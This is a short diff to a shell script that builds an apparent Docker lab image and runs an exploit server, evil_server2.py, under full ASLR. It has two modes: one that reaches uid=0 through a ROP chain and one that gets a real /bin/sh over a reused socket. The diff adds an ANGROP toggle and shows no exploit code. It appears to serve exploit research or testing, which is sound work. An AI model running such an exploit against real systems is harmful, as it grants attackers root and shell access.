@@ -10,14 +10,14 @@ echo "[*] building lab image ..."
 docker build --platform=linux/amd64 -t "$IMAGE" .
 
 echo "[*] running exploit under full ASLR ..."
-docker run --rm --platform=linux/amd64 --privileged "$IMAGE" bash -lc '
+docker run --rm --platform=linux/amd64 --privileged -e ANGROP "$IMAGE" bash -lc '
   set -e
   echo 2 > /proc/sys/kernel/randomize_va_space
   echo "[*] randomize_va_space = $(cat /proc/sys/kernel/randomize_va_space)"
   cd /work
   echo "[*] === MODE=marker (front-loaded chain -> uid=0) ==="
-  MODE=marker python3 exploit/evil_server2.py
+  ANGROP=${ANGROP:-0} MODE=marker python3 exploit/evil_server2.py
   echo "[*] === MODE=shell (real /bin/sh over the reused socket) ==="
-  MODE=shell python3 exploit/evil_server2.py
+  ANGROP=${ANGROP:-0} MODE=shell python3 exploit/evil_server2.py
   echo "[*] both modes passed."
 '
